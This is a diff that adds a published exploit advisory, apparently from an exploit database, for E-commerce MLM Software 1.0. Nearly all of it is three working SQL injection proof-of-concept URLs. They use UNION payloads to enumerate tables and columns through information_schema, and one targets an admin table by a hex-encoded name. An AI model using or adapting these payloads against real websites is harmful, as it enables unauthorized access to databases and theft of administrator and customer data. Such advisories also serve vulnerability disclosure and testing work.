@@ -1,0 +1,40 @@
+# # # # # 
+# Exploit Title: E-commerce MLM Software 1.0 - SQL Injection
+# Dork: N/A
+# Date: 08.12.2017
+# Vendor Homepage: https://www.phpscriptsmall.com/
+# Software Link: https://www.phpscriptsmall.com/product/e-commerce-mlm/
+# Demo: http://74.124.215.220/~advaemlm/
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# 1)
+# http://localhost/[PATH]/service_detail.php?pid=[SQL]
+# 
+# -6'++UNION(SELECT(1),(/*!08888Select*/+export_set(5,@:=0,(/*!08888select*/+count(*)/*!08888from*/(information_schema.columns)where@:=export_set(5,export_set(5,@,/*!08888table_name*/,0x3c6c693e,2),/*!08888column_name*/,0xa3a,2)),@,2)),(3),(4),(5),(6),(7),(8),(9),(10),(11),(12),(13),(14),(15),(16),(17))--+-
+# 
+# 
+# 2)
+# http://localhost/[PATH]/event_detail.php?eventid=[SQL]
+# 
+# -18'++UNION+ALL+SELECT+1,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=DATABASE()),3,4,5,6,7--+-
+# 
+# 
+# 3)
+# http://localhost/[PATH]/news_detail.php?newid=[SQL]
+# 
+# -27'++UNION+ALL+SELECT+1,(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_NAME=0x6d6c6d5f61646d696e)AND(0x00)IN(@x:=concat(@x,CONCAT(LPAD(@NR:=@NR+1,2,0x30),0x3a20,column_name,0x3c62723e)))))x),3,4,5,6--+-
+# 
+# 
+# # # # #
